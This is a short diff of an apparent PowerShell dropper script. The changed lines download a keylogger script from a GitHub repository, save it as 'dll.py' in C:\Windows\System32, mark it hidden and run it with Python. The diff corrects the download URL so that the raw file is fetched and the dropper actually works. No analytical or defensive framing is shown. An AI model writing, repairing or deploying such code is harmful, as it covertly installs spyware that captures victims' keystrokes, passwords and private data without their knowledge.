@@ -10,7 +10,7 @@ else{
 		
 	$bol1 = Test-Path -Path "C:\Windows\System32\dll.py"
     if (-Not $bol1){
-        Invoke-Webrequest -Uri "https://github.com/ASL-rgb/keylogger/blob/main/keylogger.py" -OutFile "C:\Windows\System32\dll.py"
+        Invoke-Webrequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/keylogger.py" -OutFile "C:\Windows\System32\dll.py"
         $Hide = Get-Item -Force -Path "C:\Windows\System32\dll.py"
         $Hide.Attributes = "hidden"
         python "C:\Windows\System32\dll.py"
